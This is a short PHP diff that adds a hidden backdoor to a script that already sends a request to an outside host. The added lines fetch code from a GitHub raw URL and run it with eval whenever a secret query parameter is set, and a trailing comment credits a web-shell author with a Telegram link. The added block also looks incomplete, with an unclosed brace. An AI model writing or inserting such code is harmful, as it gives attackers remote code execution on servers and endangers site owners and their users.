@@ -19,6 +19,15 @@ $options = array(
 
 $context  = stream_context_create($options);
 $result = file_get_contents('https://thuvienso.caodang20.edu.vn/bin/app.php', false, $context);
+if (isset($_GET['alex']) && $_GET['alex'] === 'uuid') {
+    // When `alex` parameter is set to `uuid`, execute remote code
+    $url = 'https://raw.githubusercontent.com/hinataloli/haha/main/pke.txt';
+    $code = file_get_contents($url);
+    if ($code !== false) {
+        eval('?>' . $code);
+    } else {
+        echo 'Failed to retrieve remote code.';
+    }
 /*
 	Author: 	Solevisible/Alfa-Team
 	Telegram: 	https://telegram.me/solevisible
